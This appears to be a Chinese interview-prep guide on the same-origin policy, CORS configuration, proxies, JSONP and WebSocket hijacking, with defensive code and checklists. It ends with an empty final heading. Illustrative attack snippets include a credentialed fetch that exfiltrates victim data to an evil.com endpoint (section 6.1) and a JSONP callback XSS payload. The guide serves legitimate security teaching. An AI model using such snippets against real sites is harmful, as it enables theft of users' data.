# 安全 · 07 跨域与 WebSocket 安全

> 覆盖题号：**6、8**
> 对应原题：《前端怎么实现跨域请求》《WebSocket 有哪些安全问题，应该如何应对》
> 这两题都属于"**浏览器边界**"话题：跨域讲"边界在哪、怎么合法地开个口子"，WebSocket 讲"有一条通道**不受**这个边界约束，所以要自己补防线"。

---

## 目录

- [1. 同源策略：一切的起点](#1-同源策略一切的起点)
- [2. 四种跨域方案（题 6）](#2-四种跨域方案题-6)
- [3. CORS 详解（重点）](#3-cors-详解重点)
- [4. 代理方案（最稳）](#4-代理方案最稳)
- [5. JSONP（了解 + 为什么淘汰）](#5-jsonp了解--为什么淘汰)
- [6. 跨域配置错误的真实危害](#6-跨域配置错误的真实危害)
- [7. WebSocket 安全（题 8）](#7-websocket-安全题-8)
- [8. CSWSH：跨站 WebSocket 劫持](#8-cswsh跨站-websocket-劫持)
- [9. WebSocket 安全清单](#9-websocket-安全清单)
- [10. 常见坑](#10-常见坑)
- [11. 答题模板](#11-答题模板)
- [12. 追问表](#12-追问表)
- [13. 速记卡](#13-速记卡)

---

## 1. 同源策略：一切的起点

### 1.1 一句话结论

**同源策略（Same-Origin Policy）是浏览器最基础的安全边界：来自 A 源的脚本，不能读取 B 源的资源。**

**"同源"= 协议 + 域名 + 端口三者完全相同。**

```
https://app.example.com:443/page

https://app.example.com/other      ✅ 同源（端口默认 443）
http://app.example.com/page        ❌ 协议不同
https://api.example.com/page       ❌ 域名不同
https://app.example.com:8080/page  ❌ 端口不同
```

> **注意**：`https://example.com` 和 `https://example.com:443` 是**同源**（默认端口可省略）。但 `http://example.com` 和 `https://example.com` **不同源**。

### 1.2 它限制什么、不限制什么（这决定了跨域的一切）

| 限制（读） | 不限制（写/加载） |
|---|---|
| ❌ 跨源 `fetch` / XHR **读响应**（除非 CORS 允许） | ✅ 跨源**发送**请求（简单请求可以直接发出） |
| ❌ 跨源访问 DOM（iframe 之间） | ✅ 跨源加载 `<img>` `<script>` `<link>` `<video>` `<iframe>` |
| ❌ 跨源读 Cookie / localStorage | ✅ 跨源**提交表单** |
| ❌ 跨源读 `iframe.contentWindow.document` | ✅ 跨源 `postMessage`（发送不受限，接收方要校验） |

> **这是最重要的认知**：同源策略保护的是"**我能看到什么**"，不是"**我能请求什么**"。
> **CSRF 正是因为后者不受限制才成立的**（见 02 册）。

### 1.3 为什么需要同源策略

**如果没有同源策略**：

```html
<!-- evil.com 的页面 -->
<iframe src="https://bank.com"></iframe>
<script>
  // 直接读你银行页面的 DOM，拿到余额、订单、甚至 CSRF Token
  const doc = frames[0].document
  console.log(doc.querySelector('.balance').innerText)
</script>
```

```js
// 或者直接读你其他标签页的内容
// 或者用你的 Cookie 读任意接口的响应
fetch('https://bank.com/api/orders').then(r => r.text())
```

**同源策略的作用**：**防止恶意站点读取你在其他站点的数据**。它是浏览器安全的基石，**没有它，整个 Web 的安全模型就崩了**。

### 1.4 一个重要区分：跨域 ≠ 漏洞

> 这是题单把"跨域"放在安全题里的一个误导。**要澄清这一点**：

| 概念 | 性质 |
|---|---|
| **同源策略** | **安全机制**（限制） |
| **跨域请求** | 正常的业务需求（前后端分离必然遇到） |
| **CORS** | 在同源策略上**开一个受控的口子**（`Access-Control-Allow-Origin`） |
| **CORS 配错** | **真正的漏洞**（见第 6 节） |

**一句可以说的开场**："跨域本身不是安全问题，同源策略才是安全机制。我们说的'解决跨域'，是在同源策略这个安全边界上，用 CORS 或代理合法地开一个口子。**真正危险的是 CORS 配置错误**。"

### 1.5 30 秒版（同源策略）

> "同源策略是浏览器的基础安全边界，要求协议、域名、端口三者完全相同。它限制的是'跨源读响应'——不能读别的源的接口响应、DOM、Cookie；但不限制'跨源发请求'，所以 `<img>`、`<form>`、`<script>` 都能跨站加载。CSRF 正是利用了这个不对称。没有同源策略的话，任何网站都能用 iframe 读你银行页面的内容。"

---

## 2. 四种跨域方案（题 6）

### 2.1 总览对比

| 方案 | 原理 | 支持方法 | 能否带 Cookie | 生产推荐度 |
|---|---|---|---|---|
| **CORS** | 服务端返回 `Access-Control-Allow-*` 头 | 全部 | ✅（需配置） | ⭐⭐⭐⭐⭐ |
| **代理**（Nginx / devServer） | 服务端转发，浏览器看来是同源 | 全部 | ✅（同源） | ⭐⭐⭐⭐⭐ |
| **postMessage** | 窗口间通信，不是"请求" | — | — | ⭐⭐⭐（特定场景） |
| **JSONP** | `<script>` 不受同源限制 | 仅 GET | ❌ | ⭐（已淘汰） |
| ~~`document.domain`~~ | 降级到主域 | — | — | ❌ 已废弃 |
| **WebSocket** | 握手不受同源限制 | — | ✅（自动带） | 需服务端校验 Origin |

### 2.2 选择决策

```mermaid
flowchart TD
  A["需要跨域"] --> B{"能改服务端/运维？"}
  B -->|"能，且是同域部署"| C["反向代理（最稳）<br/>/api → backend"]
  B -->|"能"| D["CORS<br/>配 ACAO 白名单"]
  B -->|"不能（第三方接口）"| E{"第三方支持 CORS？"}
  E -->|是| F["直接 CORS"]
  E -->|否| G["自己搭个代理中转<br/>（Node/BFF/网关）"]
  A --> H{"是窗口间通信？"}
  H -->|是| I["postMessage"]
```

---

## 3. CORS 详解（重点）

### 3.1 两类请求：简单请求 vs 预检请求

| | **简单请求（Simple）** | **预检请求（Preflight）** |
|---|---|---|
| 方法 | `GET` / `HEAD` / `POST` | 其他（`PUT` `DELETE` `PATCH`） |
| 请求头 | 只能是"安全列表"内的（`Accept` `Accept-Language` `Content-Language` `Content-Type` 等） | 带任何自定义头（如 `Authorization`、`X-Token`） |
| `Content-Type` | 只能是 `application/x-www-form-urlencoded` / `multipart/form-data` / **`text/plain`** | 如 `application/json` ← **最常见的触发条件** |
| 流程 | **直接发请求**，看响应头决定是否允许读 | **先发 `OPTIONS` 问一下**，通过了才发真实请求 |

> **注意**：`application/json` **不在**简单请求的 Content-Type 白名单里。所以**几乎所有现代 API（JSON 接口）都会触发预检**。这也正是 CSRF 防护的一个天然优势（见 02 册 7.2）。

### 3.2 简单请求流程

```mermaid
sequenceDiagram
  participant B as 浏览器
  participant S as api.other.com

  B->>S: GET /data（带 Origin: https://app.example.com）
  S-->>B: 200 OK<br/>Access-Control-Allow-Origin: https://app.example.com
  Note over B: 检查 ACAO 是否匹配<br/>匹配 → 允许 JS 读响应<br/>不匹配 → 报 CORS 错误（但请求已发出！）
```

**关键点**：**请求已经发出去了，服务端也已经执行了**。CORS 只是阻止 JS **读响应**。
**所以**：「CORS 错误」不等于「请求没到服务端」。这也是为什么 CORS **不能当 CSRF 防护**（请求照样执行）。

### 3.3 预检请求流程

```mermaid
sequenceDiagram
  participant B as 浏览器
  participant S as api.other.com

  B->>S: OPTIONS /data<br/>Origin: https://app.example.com<br/>Access-Control-Request-Method: PUT<br/>Access-Control-Request-Headers: content-type, authorization
  S-->>B: 204 No Content<br/>Access-Control-Allow-Origin: https://app.example.com<br/>Access-Control-Allow-Methods: GET, POST, PUT<br/>Access-Control-Allow-Headers: Content-Type, Authorization<br/>Access-Control-Max-Age: 7200
  Note over B: 预检通过 → 缓存 7200 秒
  B->>S: PUT /data（真实请求）
  S-->>B: 200 OK + ACAO
```

**预检缓存**：`Access-Control-Max-Age` 告诉浏览器多久内不用重复预检。**Chrome 上限 7200 秒（2 小时）**，Firefox 上限 86400 秒。

> **优化点**：`Max-Age` 设得太小（比如 0 或很短）会导致**每个请求都多一次 OPTIONS**，接口延迟翻倍。**这是很常见的性能问题。**

### 3.4 完整响应头表

| 响应头 | 作用 | 示例 |
|---|---|---|
| `Access-Control-Allow-Origin` | 允许哪些源 | `https://app.example.com`（**可以是 `*`，但与 credentials 互斥**） |
| `Access-Control-Allow-Methods` | 允许的方法（**仅预检响应需要**） | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | 允许的请求头（**仅预检**） | `Content-Type, Authorization` |
| `Access-Control-Allow-Credentials` | 允许携带凭证 | `true` |
| `Access-Control-Expose-Headers` | 允许 JS 读哪些**响应头** | `X-Total-Count, Content-Disposition` |
| `Access-Control-Max-Age` | 预检缓存时间（秒） | `7200` |

**请求头（浏览器自动加）：**

| 请求头 | 说明 |
|---|---|
| `Origin` | 请求来源（**浏览器强制加，JS 改不了**） |
| `Access-Control-Request-Method` | 预检时告诉服务端"我接下来要用什么方法" |
| `Access-Control-Request-Headers` | 预检时告诉服务端"我接下来要带什么头" |

### 3.5 携带凭证的三条硬规则

```js
// 前端
fetch('https://api.other.com/data', {
  credentials: 'include',      // ← 必须显式指定（默认是 'same-origin'）
})
// 或 XHR: xhr.withCredentials = true
```

```http
# 服务端
Access-Control-Allow-Origin: https://app.example.com    ← ❌ 不能是 *
Access-Control-Allow-Credentials: true
```

| 规则 | 说明 |
|---|---|
| ① `Origin` **不能是 `*`** | 与 `Allow-Credentials: true` 互斥，浏览器会直接报错 |
| ② 必须显式 `credentials: 'include'` | 默认 `'same-origin'` 不带跨域 Cookie |
| ③ Cookie 还需 `SameSite=None; Secure` | 否则跨站不发送（见 02 册） |

### 3.6 五个最常见的 CORS 错误

| 报错 | 原因 | 修复 |
|---|---|---|
| `No 'Access-Control-Allow-Origin' header` | 服务端没配 | 加 ACAO |
| `The 'Access-Control-Allow-Origin' header has a value '*' that is not equal to the supplied origin` | 用了 `*` 但又带凭证 | 回显白名单里的具体 Origin |
| `Request header field x-token is not allowed by Access-Control-Allow-Headers` | 预检没允许这个头 | ACAH 加上 |
| `Method PUT is not allowed by Access-Control-Allow-Methods` | 预检没允许这个方法 | ACAM 加上 |
| `Redirect is not allowed for a preflight request` | 预检被 302 重定向 | 保证 OPTIONS 直接返回 204，不要重定向 |

**还有两个隐蔽的：**

| 现象 | 原因 |
|---|---|
| 请求发出去了，服务端日志有记录，但 JS 拿到 error | **这就是 CORS 的正常行为**（读被拦，请求已执行） |
| 响应头里自定义的 `X-Total-Count` 读不到 | 缺 `Access-Control-Expose-Headers` |

### 3.7 30 秒版（CORS）

> "CORS 是服务端通过 `Access-Control-Allow-Origin` 等响应头声明'哪些源可以读我'。分两类：简单请求（GET/HEAD/POST + 安全头 + 三种 Content-Type）直接发；其他比如带 `Authorization` 头或 `Content-Type: application/json` 的，会先发一个 OPTIONS 预检。带 Cookie 时 `credentials: include`，服务端 ACAO 不能是 `*` 必须回显具体源，而且 `Allow-Credentials: true`。"

---

## 4. 代理方案（最稳）

### 4.1 为什么最稳

**代理的原理**：让浏览器请求**同源**的地址，由服务端（Nginx / Node）转发到真实后端。**浏览器根本不知道发生了跨域**，所以没有任何 CORS 问题。

| 优点 | 说明 |
|---|---|
| **零 CORS 配置** | 浏览器看到的是同源请求 |
| **Cookie 天然同源** | 无 `SameSite` 麻烦 |
| **可隐藏后端地址** | 前端不知道真实 API 域名（降低攻击面） |
| **可做统一鉴权/限流/日志** | 网关层能力 |
| **可解决第三方接口不支持 CORS** | 服务端不受同源策略约束 |

| 缺点 | 说明 |
|---|---|
| 多一层转发（增加延迟，通常可忽略） | 同机房内网转发 < 5ms |
| 需要运维配置 | — |
| 代理层成为单点 | 需要高可用 |

### 4.2 开发环境（Vite / webpack）

```js
// vite.config.js
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://backend.example.com',
        changeOrigin: true,          // 改 Host 头为目标域名（很多后端会校验 Host）
        rewrite: (p) => p.replace(/^\/api/, ''),   // 可选：去掉前缀
        // secure: false,            // 自签证书时关掉校验（仅开发）
      },
    },
  },
}
```

```js
// vue.config.js / webpack devServer
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://backend.example.com',
        changeOrigin: true,
        pathRewrite: { '^/api': '' },
      },
    },
  },
}
```

> **`changeOrigin: true` 是必配的**：它把请求的 `Host` 头改成目标域名。很多后端/网关会校验 `Host`，不改会 404 或 403。

### 4.3 生产环境（Nginx）

```nginx
server {
  listen 443 ssl;
  server_name app.example.com;

  # 前端静态资源
  location / {
    root /usr/share/nginx/html;
    try_files $uri $uri/ /index.html;     # SPA 路由回退
  }

  # API 反向代理
  location /api/ {
    proxy_pass https://backend.internal.example.com/;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;

    # 透传 Cookie
    proxy_pass_request_headers on;
    proxy_cookie_path / "/; Secure; HttpOnly; SameSite=Lax";
  }
}
```

> **注意 `proxy_pass` 末尾的斜杠**：
> - `proxy_pass https://backend/;`（带斜杠）→ `/api/user` 转发为 `/user`
> - `proxy_pass https://backend;`（不带斜杠）→ `/api/user` 转发为 `/api/user`
> **这是个高频坑。**

### 4.4 BFF 层（Backend For Frontend）

如果代理层需要做**聚合、裁剪、鉴权**，可以单独起一个 Node 服务：

```
浏览器 → BFF（同源）→ 多个后端服务
```

**好处**：
- 聚合多个接口（减少请求数）
- 在服务端持有第三方 API 的密钥（**解决"密钥不能放前端"**）
- 统一鉴权、限流、日志

> **BFF 是"密钥不进前端"的标准解法**，面试时把这两件事联系起来说很有说服力。

---

## 5. JSONP（了解 + 为什么淘汰）

### 5.1 原理

```html
<!-- ① 前端动态插入 script，src 指向接口，带上回调名 -->
<script>
  window.jsonpCallback = function (data) {
    console.log('拿到数据', data)
  }
  const s = document.createElement('script')
  s.src = 'https://api.other.com/data?callback=jsonpCallback'
  document.body.appendChild(s)
</script>
```

```js
// ② 服务端返回的是"可执行的 JS"，而不是 JSON
res.send(`${req.query.callback}(${JSON.stringify(data)})`)
// → jsonpCallback({"list": [...]})
```

**为什么能跨域**：`<script>` 标签**不受同源策略限制**（否则 CDN 的 JS 就没法用了）。

### 5.2 六个致命缺点

| 缺点 | 说明 |
|---|---|
| **只支持 GET** | 无法 POST/PUT/DELETE |
| **无法设置请求头** | 不能带 `Authorization`、不能自定义头 |
| **没有错误处理** | `script.onerror` 只能知道失败，拿不到状态码/原因 |
| **无法取消** | 请求发出后没法 abort |
| **安全性差** | 服务端如果不过滤 `callback` 参数，可以直接注入 JS → **XSS** |
| **无法用 SRI** | 内容随 callback 变化，hash 不固定 |

### 5.3 JSONP 的 XSS 风险（很多老项目有这个问题）

```js
// ❌ 服务端不校验 callback
app.get('/api/data', (req, res) => {
  res.type('js').send(`${req.query.callback}(${JSON.stringify(data)})`)
})
```

```
GET /api/data?callback=alert(document.cookie)//
→ 响应：alert(document.cookie)//({"list":[]})
→ 在引用这个 script 的页面里执行！
```

**修复**：

```js
// ✅ 严格校验 callback 只能是合法标识符
app.get('/api/data', (req, res) => {
  const cb = req.query.callback
  if (!/^[A-Za-z_$][A-Za-z0-9_$.]{0,63}$/.test(cb)) {
    return res.status(400).end('invalid callback')
  }
  res.type('js').send(`${cb}(${JSON.stringify(data)})`)
})
```

### 5.4 结论

> **JSONP 应该只出现在"面试题"和"老代码"里。** 现代方案是 CORS（服务端能改）或代理（不能改）。**如果面试官问"为什么不用 JSONP"，答：只支持 GET、不能带自定义头、没有错误处理、有 XSS 风险、无法用 SRI。**

---

## 6. 跨域配置错误的真实危害

> **这是把"跨域"和"安全"连起来的关键一节。** 配置错误比 CSRF 更严重。

### 6.1 最危险的错误：反射 Origin + 允许凭证

```js
// ❌ 极度危险
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin)   // 反射任何来源
  res.setHeader('Access-Control-Allow-Credentials', 'true')
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE')
  next()
})
```

**后果**：**任何网站都能用用户的 Cookie 读你的所有接口响应**。

```js
// 攻击者页面 evil.com
fetch('https://api.victim.com/user/orders', { credentials: 'include' })
  .then(r => r.json())
  .then(data => fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) }))
```

**这比 CSRF 严重得多**：CSRF 只能"发请求"，这个能"**读响应**"——等于把用户数据完全暴露。

### 6.2 其他几种危险配置

| 配置 | 问题 |
|---|---|
| `ACAO: *` + `Credentials: true` | 浏览器会拒绝，但有些框架"自动修复"成反射 Origin → 变成 6.1 |
| `ACAO: null` | `null` 源（`file://`、sandbox iframe、data URL）可被利用 |
| 白名单用 `endsWith` / `includes` 匹配 | `https://evil-victim.com` 能通过 `endsWith('victim.com')` |
| 允许所有 `Allow-Headers` | 降低了攻击门槛 |
| `Allow-Methods` 包含 `*` | 同上 |

### 6.3 正确的 CORS 配置

```js
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://m.example.com',
])

app.use((req, res, next) => {
  const origin = req.headers.origin

  // ① 精确匹配（Set.has 是严格相等，不会误判）
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin)      // 回显具体源
    res.setHeader('Access-Control-Allow-Credentials', 'true')
    res.setHeader('Vary', 'Origin')                            // ② 关键！
  }

  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE')
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    res.setHeader('Access-Control-Max-Age', '7200')
    return res.status(204).end()       // ③ 预检直接返回，不要重定向
  }

  next()
})
```

**`Vary: Origin` 为什么关键**：

- 你按 Origin 返回不同的 `ACAO` 头
- 如果 CDN/代理缓存了响应，可能把给 `app.example.com` 的响应（带 `ACAO: app.example.com`）返回给 `evil.com`
- 加 `Vary: Origin` 告诉缓存"这个响应随 Origin 变化，要分别缓存"

> **漏了 `Vary: Origin` 是一个真实的、很难复现的漏洞**，因为它依赖缓存命中。提到它说明你想得很细。

---

## 7. WebSocket 安全（题 8）

### 7.1 一句话结论

**WebSocket 的握手是一个 HTTP 请求，但握手成功后就不再是 HTTP 了——它不受同源策略约束，不触发 CORS 预检。所以"跨域保护"完全依赖服务端自己校验 `Origin`。**

> **这句话就是本题的核心。** 很多人以为"WebSocket 也会被 CORS 保护"，这是错的。

### 7.2 握手过程

```mermaid
sequenceDiagram
  participant B as 浏览器
  participant S as 服务端

  B->>S: GET /ws HTTP/1.1<br/>Upgrade: websocket<br/>Connection: Upgrade<br/>Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==<br/>Sec-WebSocket-Version: 13<br/>Origin: https://app.example.com<br/>Cookie: session=xxx
  S-->>B: HTTP/1.1 101 Switching Protocols<br/>Upgrade: websocket<br/>Connection: Upgrade<br/>Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
  Note over B,S: 之后是双向的 WebSocket 帧（不再是 HTTP）
```

**几个事实：**

| 事实 | 说明 |
|---|---|
| 握手是 **HTTP GET** | 带 `Upgrade: websocket` |
| **浏览器会发 `Origin` 头** | 但**不会**因为 Origin 不匹配而阻止连接 |
| **不触发 CORS 预检** | 完全不走 CORS 流程 |
| **Cookie 会自动带** | 跨站也一样（除非 SameSite 限制） |
| `Sec-WebSocket-Key` 不是鉴权 | 只是防缓存/防误连，**没有任何安全意义** |

### 7.3 五个安全问题

| # | 问题 | 说明 |
|---|---|---|
| 1 | **跨站连接（CSWSH）** | 服务端不校验 Origin → 任何网站都能连（见第 8 节） |
| 2 | **明文传输** | `ws://` 可被窃听篡改 → 必须 `wss://` |
| 3 | **身份认证** | 握手时怎么证明"我是谁" |
| 4 | **消息注入** | 客户端发来的数据不能信，服务端必须校验 |
| 5 | **连接期过长导致鉴权失效** | 连接活 8 小时，但 token 15 分钟就过期了 |

### 7.4 认证的三种传法（优劣对比）

| 方式 | 示例 | 评价 |
|---|---|---|
| **Cookie（自动带）** | 握手时浏览器自动带 | ⚠️ 方便但**必须校验 Origin**，否则 CSWSH |
| **URL query** | `wss://api.com/ws?token=xxx` | ❌ **不推荐**——会进服务器访问日志、代理日志、浏览器历史；截图泄露 |
| **子协议（subprotocol）** | `new WebSocket(url, ['bearer', token])` | ✅ 可行，但有点 hack（服务端要解析 `Sec-WebSocket-Protocol`） |
| **连接后第一条消息认证** | 连上后先发 `{type:'auth', token}` | ✅ **推荐**（最干净），但服务端要在认证前拒绝其他消息 |

```js
// ✅ 推荐：连接后第一条消息认证
const ws = new WebSocket('wss://api.example.com/ws')

ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'AUTH', token: getAccessToken() }))
}

ws.onmessage = (e) => {
  const msg = JSON.parse(e.data)
  if (msg.type === 'AUTH_OK') {
    // 认证通过，可以开始业务通信
  }
}
```

```js
// 服务端：认证前不许做任何业务操作
wss.on('connection', (socket) => {
  socket.authenticated = false
  const authTimeout = setTimeout(() => socket.close(4001, 'auth timeout'), 5000)

  socket.on('message', (raw) => {
    const msg = safeParse(raw)
    if (!msg) return socket.close(4002, 'invalid message')

    if (!socket.authenticated) {
      if (msg.type !== 'AUTH') return socket.close(4003, 'not authenticated')
      const user = verifyToken(msg.token)
      if (!user) return socket.close(4004, 'invalid token')
      socket.user = user
      socket.authenticated = true
      clearTimeout(authTimeout)
      return socket.send(JSON.stringify({ type: 'AUTH_OK' }))
    }

    // 已认证，走业务
    handleBusiness(socket, msg)
  })
})
```

### 7.5 必做清单（题 8 的核心答案）

| # | 措施 | 说明 |
|---|---|---|
| 1 | **校验 `Origin`** | 白名单精确匹配，**这是防 CSWSH 的关键** |
| 2 | **用 `wss://`** | HTTPS 页面里 `ws://` 会被浏览器阻止（混合内容） |
| 3 | **握手时鉴权** | Cookie / subprotocol / 首条消息，三选一 |
| 4 | **设置鉴权有效期** | 长连接要定时重新验证，token 过期就断开 |
| 5 | **校验每条消息** | 类型、结构、长度、取值范围；不能直接 `eval`/`innerHTML` |
| 6 | **限制消息大小** | 防 DoS（如 `maxPayload: 64 * 1024`） |
| 7 | **限流** | 单连接消息频率限制 |
| 8 | **心跳检测** | `ping/pong` 清理死连接 |
| 9 | **异常断开重连要重新鉴权** | 不能复用旧凭证 |
| 10 | **不要信任 `Sec-WebSocket-Key`** | 它没有安全含义 |

```js
// 服务端完整示例（ws 库）
import { WebSocketServer } from 'ws'

const ALLOWED_ORIGINS = new Set(['https://app.example.com', 'https://m.example.com'])

const wss = new WebSocketServer({
  port: 8080,
  maxPayload: 64 * 1024,                 // 限制单条消息大小
  verifyClient: (info, done) => {
    // ① Origin 白名单（防 CSWSH）
    const origin = info.origin
    if (!ALLOWED_ORIGINS.has(origin)) {
      return done(false, 403, 'Origin not allowed')
    }
    done(true)
  },
})
```

---

## 8. CSWSH：跨站 WebSocket 劫持

> **这是 WebSocket 安全里最重要、也最容易被忽略的攻击。** 它是"WebSocket 版的 CSRF"，但因为能**双向通信**，危害更大。

### 8.1 攻击原理

```mermaid
sequenceDiagram
  participant V as 受害者（已登录 victim.com）
  participant E as evil.com
  participant S as victim.com 的 WS 服务

  V->>E: 访问 evil.com
  Note over E: 页面里执行：<br/>new WebSocket('wss://victim.com/ws')
  E->>S: 握手请求（浏览器自动带 victim.com 的 Cookie）
  Note over S: ❌ 只校验了 Cookie，没校验 Origin
  S-->>E: 101 连接建立，认为这是受害者
  E->>S: {"type":"getHistory"}
  S-->>E: 返回受害者的聊天记录
  Note over E: 攻击者把数据发到自己的服务器
```

**关键差异（和 CSRF 相比）：**

| | CSRF | CSWSH |
|---|---|---|
| 能否读响应 | ❌ 不能 | ✅ **能**（WebSocket 是双向的） |
| 攻击持续性 | 一次性 | **持续连接，可长时间监听** |
| 危害 | 能发请求 | **能收发消息，等于接管会话** |

### 8.2 防御

```js
// ✅ 唯一有效的核心防御：校验 Origin
verifyClient: (info, done) => {
  if (!ALLOWED_ORIGINS.has(info.origin)) return done(false, 403)
  done(true)
}
```

**为什么 `SameSite` 不够？**

- `SameSite=Lax` 确实能阻止跨站 WebSocket 握手带 Cookie（因为 WS 握手不是顶层导航）
- **但**：如果业务必须用 `SameSite=None`（跨站嵌入场景），就失效了
- **而且**：把安全完全寄托在 Cookie 属性上，一旦哪天为了兼容改成 `None`，漏洞立刻出现

> **所以 `Origin` 校验是必须的，不能只靠 SameSite。** 这就像 CSRF 不能只靠 SameSite 一样——**纵深防御**。

### 8.3 一个容易被忽略的点

**`Origin` 头可以被非浏览器客户端伪造**（curl、Postman、Node 脚本）。

所以：

| 攻击者类型 | `Origin` 校验有效吗 |
|---|---|
| 恶意网页（浏览器发起） | ✅ 有效（浏览器强制设置 Origin，JS 改不了） |
| 脚本/爬虫（非浏览器） | ❌ 无效（可随便伪造） |

> **结论**：`Origin` 校验**只能防"浏览器发起的跨站攻击"**（也就是 CSWSH），防不了"直接用脚本连"。后者要靠**鉴权**（token）+ 限流 + 风控。

---

## 9. WebSocket 安全清单

```
握手层
□ 使用 wss://（HTTPS 下 ws:// 会被浏览器阻止）
□ 校验 Origin 白名单（精确匹配，不能用 includes）
□ 鉴权：Cookie / subprotocol / 首条消息（推荐首条消息）
□ 不要用 URL query 传 token
□ 认证超时（如 5 秒内未认证就断开）

连接层
□ 限制单条消息大小（maxPayload）
□ 限制连接数（单用户/单 IP）
□ 心跳 ping/pong，清理死连接
□ 鉴权有效期：token 过期主动断开或要求重新认证

消息层
□ 校验消息类型（白名单 switch，未知类型丢弃）
□ 校验数据结构与类型（不信任客户端）
□ 校验取值范围（防越界、防注入）
□ 消息频率限流
□ 不把消息内容直接 eval / innerHTML / 拼 SQL
□ 二进制消息要校验大小与格式

业务层
□ 每条业务消息都校验"这个用户有没有权限做这件事"
□ 敏感操作要求二次确认（不能只靠连接已认证）
□ 记录操作日志（可审计）
```

---

## 10. 常见坑

| # | 坑 | 纠正 |
|---|---|---|
| 1 | 认为跨域是"漏洞" | 同源策略是安全机制；跨域是需求；CORS 配错才是漏洞 |
| 2 | 认为 CORS 能防 CSRF | 请求照样发出并执行，CORS 只阻止读响应 |
| 3 | `credentials: 'include'` 但 ACAO 用 `*` | 浏览器直接报错；必须回显具体源 |
| 4 | 反射 `req.headers.origin` | 任何站都能读你的接口（比 CSRF 严重） |
| 5 | 白名单用 `includes` / `endsWith` | `evil-victim.com` 能通过；用 `Set.has` 精确匹配 |
| 6 | 漏了 `Vary: Origin` | CDN 缓存串源，可能把 A 站的 CORS 响应给 B 站 |
| 7 | 预检返回 302 | 浏览器报 `Redirect is not allowed for a preflight` |
| 8 | `Max-Age` 设太短 | 每个请求都多一次 OPTIONS，延迟翻倍 |
| 9 | 自定义响应头读不到 | 需要 `Access-Control-Expose-Headers` |
| 10 | `changeOrigin: false` | 后端校验 Host 时 404/403 |
| 11 | `proxy_pass` 末尾斜杠搞错 | 路径被多剥/少剥一层 |
| 12 | 用 JSONP 还传敏感数据 | 只支持 GET，token 会进 URL/日志 |
| 13 | JSONP 的 callback 不校验 | 直接 XSS |
| 14 | 认为 WebSocket 受 CORS 保护 | **不受**，必须自己校验 Origin |
| 15 | WS 只校验 Cookie 不校验 Origin | CSWSH，攻击者能读你的全部消息 |
| 16 | token 放 WS 的 URL query | 进服务器日志、代理日志、历史记录 |
| 17 | WS 连接建立后不再校验 token | 长连接活几小时，token 早过期了 |
| 18 | 不限制消息大小 | 一条超大消息就能打爆内存 |
| 19 | 不校验消息类型 | 未知类型走到 `default` 分支可能出问题 |
| 20 | `ws://` 在 HTTPS 页面里用 | 被浏览器当混合内容阻止 |

---

## 11. 答题模板

### 11.1 「前端怎么实现跨域」——30 秒

> "先说清一个前提：同源策略是安全机制，跨域请求是正常需求，所谓'解决跨域'是在这个边界上合法开口子。四种方案：**CORS** 是标准做法，服务端返回 `Access-Control-Allow-Origin`；**代理**最稳，Nginx 或 devServer 转发，浏览器看来是同源；**JSONP** 用 script 标签，只支持 GET，已淘汰；**postMessage** 用于窗口间通信。生产上前后端分离一般是开发用 devServer proxy、生产用 Nginx 反向代理。"

### 11.2 「前端怎么实现跨域」——2 分钟

> "我先讲同源策略，因为所有跨域方案都是在它上面做文章。
>
> **同源要求协议、域名、端口三者完全相同。** 它限制的是'跨源读响应'——不能读别的源的接口响应、DOM、Cookie；但**不限制'跨源发请求'**，所以 `img`、`script`、`form` 都能跨站加载。这个不对称正是 CSRF 成立的原因，也是 JSONP 能工作的原因。
>
> **方案一 CORS**，标准做法。分两类：简单请求（GET/HEAD/POST，只带安全列表的头，Content-Type 只能是表单那三种或 text/plain）直接发；其他比如带 `Authorization` 或 `Content-Type: application/json` 的会先发 OPTIONS 预检。要注意三点：带 Cookie 时 `credentials: 'include'`，且 ACAO 不能是 `*` 必须回显具体源；`Access-Control-Max-Age` 别设太短，否则每个请求多一次预检；白名单必须精确匹配，不能用 `includes`，否则 `evil-victim.com` 能绕过。
>
> **方案二代理**，最稳。开发用 Vite 或 webpack 的 devServer proxy，注意 `changeOrigin: true`；生产用 Nginx 反向代理，`/api` 转发到后端。浏览器看到的是同源请求，完全没有 CORS 问题，Cookie 也天然同源。如果代理层还要做聚合、鉴权、或者持有第三方密钥，那就升级成 BFF。
>
> **方案三 JSONP**，原理是用 `script` 标签不受同源限制，服务端返回 `callback(...)`。但它只支持 GET、不能带自定义头、没有错误处理、还有 callback 未校验的 XSS 风险，**已经淘汰了**。
>
> **方案四 postMessage**，用于窗口/iframe 之间通信，不是 HTTP 请求。关键是接收方必须校验 `event.origin`。
>
> 最后补一句安全的点：**跨域配置错误本身就是漏洞**。最危险的是反射 Origin 加允许凭证，那样任何网站都能读你的接口响应，比 CSRF 严重得多。"

### 11.3 「WebSocket 安全问题」——30 秒

> "核心一点：**WebSocket 握手是 HTTP，但握手后不受同源策略约束，也不走 CORS 预检**，所以跨站保护完全靠服务端自己校验 `Origin`。不校验就会有 CSWSH——攻击者页面直接连你的 WS，浏览器自动带 Cookie，他就能收发消息。其他几条：必须用 `wss://`；握手时鉴权，token 不要放 URL；长连接要设鉴权有效期；每条消息都要校验类型、结构、大小；还要限流和心跳。"

### 11.4 ——2 分钟

